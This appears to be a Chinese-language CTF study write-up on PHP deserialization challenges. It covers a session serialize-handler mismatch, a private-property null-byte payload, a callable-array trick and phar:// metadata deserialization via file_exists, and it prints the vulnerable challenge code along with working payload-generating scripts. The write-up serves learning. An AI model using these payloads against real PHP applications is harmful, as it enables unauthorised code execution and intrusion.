<p>PHP 在存储 session 数据时，需要将数组或对象序列化为字符串。序列化处理器决定了如何序列化和反序列化 session 数据。</p>
<p><strong>常见的序列化处理器：</strong></p>
<ul>
<li><strong><code>php</code></strong>（默认）：使用键名 + <code>|</code> + 序列化值 的格式<ul>
<li>例如：<code>user|s:5:&quot;admin&quot;;</code></li>
</ul>
</li>
<li><strong><code>php_serialize</code></strong>（PHP 5.5.4+）：使用标准的 <code>serialize()</code> 函数格式<ul>
<li>例如：<code>a:1:{s:4:&quot;user&quot;;s:5:&quot;admin&quot;;}</code></li>
</ul>
</li>
<li><strong><code>php_binary</code></strong>：使用二进制格式</li>
</ul>
<p><strong><code>php</code>处理器的具体格式：</strong></p>
<p>当使用 <code>php</code> 处理器时：</p>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;key&#x27;</span>] = <span class="string">&#x27;value&#x27;</span>;</span><br><span class="line"><span class="comment">// 存储为：key|s:5:&quot;value&quot;;</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>反序列化时，会寻找第一个 <code>|</code> 字符：</p>
<ul>
<li><code>|</code> 左边是键名（key）</li>
<li><code>|</code> 右边是值的序列化字符串（serialized value）</li>
</ul>
<div class="table-container"><table>
<thead>
<tr>
<th align="left">特点</th>
<th align="left"><code>unserialize()</code></th>
<th align="left"><code>session_start()</code> + <code>php</code> 处理器</th>
</tr>
</thead>
<tbody><tr>
<td align="left">触发方式</td>
<td align="left">直接调用函数</td>
<td align="left">自动反序列化 session 数据</td>
</tr>
<tr>
<td align="left">输入控制</td>
<td align="left">通常来自参数</td>
<td align="left">来自 session 存储</td>
</tr>
<tr>
<td align="left">利用难度</td>
<td align="left">需要找到参数</td>
<td align="left">需要控制 session 数据</td>
</tr>
<tr>
<td align="left">常见场景</td>
<td align="left">直接反序列化漏洞</td>
<td align="left">session 反序列化漏洞</td>
</tr>
</tbody></table></div>
<p>两个代码联合起来看，有会话被序列化的配置，传入的参数会赋给会话，也就是会话赋值，</p>
<p>un42.php 用 <code>php</code>处理器读取时，会将竖线 | 前面的内容视为键名（这里为空），后面的内容被当作值反序列化，从而执行恶意代码。</p>
<p>利用<code>php</code>处理器不适配，</p>
<p>session 数据默认存储在服务器的临时文件中（比如<code>/tmp/sess_xxxxxx</code>，<code>xxxxxx</code>是 session_id）。</p>
<p>典型的 session 反序列化漏洞，即两个⻚面设置的session 序列化方式不同<br>这里42是能通过直接创建一个funny的实例 销毁了过后直接就flag了 4这里是储存到会话 然后serialize() 负责 “写入 session 数据”（用<code>php_serialize</code>格式）</p>
<p><code>php</code>处理器解析 session 数据时，会按第一个 | 把字符串拆成「键名」和「要反序列化的值」<code>|</code>左边被当成空键名，<code>|</code>右边的<code>funny</code>对象序列化字符串会被当成 “值”，触发反序列化。</p>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funny</span></span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">new</span> funny;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(“|” . <span class="title function_ invoke__">serialize</span>(<span class="variable">$x</span>));</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>全过程 php处理器解析 session 数据：<br>把<code>a:1:{s:8:”tryhackme”;s:31:”|O:5:”funny”:1:{s:1:”a”;N;}”;}</code>当成普通字符串（因为<code>php</code>处理器不认识<code>php_serialize</code>的数组格式）；<br>按第一个 | 分割：左边是<code>a:1:{s:8:”tryhackme”;s:31:”</code>（被当成键名），右边是<code>O:5:”funny”:1:{s:1:”a”;N;}</code>（被当成 “值”）；</p>
<p>PHP 自动对右边的funny对象序列化字符串执行<code>unserialize()</code> → 生成funny对象</p>
<h3 id="un-5"><a href="#un-5" class="headerlink" title="un-5"></a>un-5</h3><div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag5.php&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funny</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$a</span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;givemeflag&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;a === <span class="string">&quot;givemeflag&quot;</span>) &#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;tryhackme&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;tryhackme&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;tryhackme&#x27;</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>);<span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$a</span>[<span class="variable">$i</span>]) &lt; <span class="number">32</span> || <span class="title function_ invoke__">ord</span>(<span class="variable">$a</span>[<span class="variable">$i</span>]) &gt; <span class="number">126</span>) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;你到底行不行啊&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>上半部分：要先触发<code>__construct()</code>再触发<code>__destruct()</code></p>
<p><code>__construct()</code>：创建对象时自动执行，PHP允许开发者在一个类中定义一个方法作为构造函数。具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作。</p>
<p>这一部分就是数据销毁前的状态</p>
<p>下半部分：传入内容是字符串，匹配前三十二号和126号后的字符串，所以要把 有效内容放在这个中间，再反序列化</p>
<p><code>ord()</code> — 转换字符串第一个字节为 0-255 之间的值</p>
<p><code>chr()</code> — 从数字生成单字节字符串</p>
<p>两个函数互补</p>
<p>所以这里其实不是字符串长度中间的部分过滤而是要控制ASCII值</p>
<p>这里涉及了序列化对私有属性处理的特点：</p>
<p>私有属性在输出的变量前后会相当于有%00，所以结果就是在序列化之后得到的数据长度会比类名+属性名多出两个字符长度</p>
<p>但是这里又要求必须要有有效字符，也就是说需要我们手动编码，这里用十六进制就好</p>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">5</span>:<span class="string">&quot;funny&quot;</span>:<span class="number">1</span>:&#123;S:<span class="number">8</span>:<span class="string">&quot;\00funny\00a&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;givemeflag&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>然后再url编码</p>
<h3 id="un-6"><a href="#un-6" class="headerlink" title="un-6"></a>un-6</h3><div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag6.php&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funny</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">pyflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;tryhackme&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;tryhackme&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;tryhackme&#x27;</span>]);</span><br><span class="line"><span class="variable">$a</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>乍一看总觉得是6和5设置反了，但是6这里有一个<code>$a()</code>把变量当函数调用可以触发一个魔术方法，但是源代码没有，推测需要我们自己构造触发</p>
<p>依旧有判断是不是字符串的，但是我现在暂时还不能确定这个判断到底过滤了什么</p>
<p>还是有触发函数，等会这个<code>$a</code>是不是用来触发pyflag函数的</p>
<p><code>is_string()</code> — 检测变量的类型是否是字符串</p>
<p>这里和调用引用关系那里还是不一样</p>
<p><code>$a()</code>：PHP会尝试调用 <code>$a</code> 这个变量，如果 <code>$a</code> 是函数名，就调用该函数；如果 <code>$a</code> 是数组 <code>[对象, 方法名]</code>，就调用该对象的方法</p>
<p>a自己本身不能作为我们需要的那个函数，pyflag才是我们需要的函数，那就用数组</p>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funny</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">pyflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">funny</span>();  </span><br><span class="line"><span class="variable">$c</span> = [<span class="variable">$b</span>,<span class="string">&quot;pyflag&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>



<h3 id="un-7"><a href="#un-7" class="headerlink" title="un-7"></a>un-7</h3><div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag7.php&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funny</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$a</span> === <span class="string">&quot;check&quot;</span>) &#123;</span><br><span class="line">		<span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$b</span>) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$b</span>)) &#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$b</span> is exist!&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$a</span> === <span class="string">&quot;upload&quot;</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="string">&quot;./upload&quot;</span>))&#123;</span><br><span class="line">			<span class="title function_ invoke__">mkdir</span>(<span class="string">&quot;./upload&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$filename</span> = <span class="string">&quot;./upload/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">1</span>, <span class="number">10000</span>).<span class="string">&quot;.txt&quot;</span>;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]))&#123;</span><br><span class="line">			<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]));</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;Your file path:<span class="subst">$filename</span>&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>先是触发<code>__destruct()</code>，输入action，但是内容有限制，但是没关系还有提交file，但是要检查是否为空，所以不能从if走，要去走else if，所以就是action需要满足upload</p>
<p>但是等等file为空这个可以绕过吗？</p>
<p><code>is_dir</code>— 判断给定文件名是否是一个目录</p>
<p><code>mkdir</code>— 创建一个或多个新的目录</p>
<p>长度限制，后缀被闭合，</p>
<p><code>file_put_contents</code>：把数据写入文件</p>
<p>这是一个 PHP 反序列化漏洞的题目，通过 <code>phar://</code> 协议触发反序列化来执行 <code>funny</code> 类的 <code>__destruct()</code> 方法，从而输出 flag。</p>
<p>题目本身没有序列化的处理，所以正常来说是不能使用反序列化漏洞的，但是 如果使用 <code>phar://</code> 伪协议读取一个 PHAR 文件（PHP Archive），PHP 会自动解析该文件中的元数据（Metadata）。而这个元数据是以序列化的形式存储的。 这意味着：<code>file_exists(&quot;phar://path/to/file&quot;)</code> 等同于 <code>unserialize(metadata)</code>。即使文件后缀是 <code>.txt</code>，只要内容符合 PHAR 格式，<code>phar://</code> 协议依然能解析它。</p>
<p>对phar的描述是：phar 归档的最佳特征是可以将多个文件组合成一个文件。 因此，phar 归档提供了在单个文件中分发完整的 PHP 应用程序并无需将其解压缩到磁盘而直接运行文件的方法。此外，phar 归档可以像任何其他文件一样由 PHP 在命令行和 Web 服务器上执行。phar 有点像 PHP 应用程序的移动存储器。</p>
<ul>
<li><p>包含 <code>flag7.php</code>（定义 <code>$flag</code> 变量）</p>
</li>
<li><p>定义 <code>funny</code> 类，其 <code>__destruct()</code> 方法输出 <code>$flag</code></p>
</li>
<li><p>提供两个操作：</p>
<ul>
<li><code>action=check</code>：检查文件是否存在</li>
<li><code>action=upload</code>：上传文件（base64 编码内容）</li>
</ul>
</li>
<li><p><code>check</code> 操作使用 <code>file_exists($b)</code>，其中 <code>$b</code> 用户可控</p>
</li>
<li><p>可以使用 <code>phar://</code> 协议触发反序列化</p>
</li>
<li><p><code>upload</code> 操作可以上传任意文件内容 伪协议上传文件</p>
</li>
</ul>
<p>其实需要我们提交两次请求，一次负责检查一次负责上传，先把文件上传了，在之后的检查中才能通过协议触发反序列化</p>
<ol>
<li>构造一个 phar 文件，包含 <code>funny</code> 对象</li>
<li>通过 <code>upload</code> 功能上传该 phar 文件（base64 编码）</li>
<li>通过 <code>check</code> 功能使用 <code>phar://</code> 协议访问上传的文件，触发反序列化</li>
</ol>
<p>创建phar文件</p>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funny</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 空类即可，目标环境已定义</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建 phar 文件</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;exploit.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;test&#x27;</span>); <span class="comment">// 添加文件内容</span></span><br><span class="line"><span class="variable">$object</span> = <span class="keyword">new</span> <span class="title function_ invoke__">funny</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$object</span>); <span class="comment">// 设置 metadata 为 funny 对象</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Phar 文件生成成功\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;exploit.phar&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

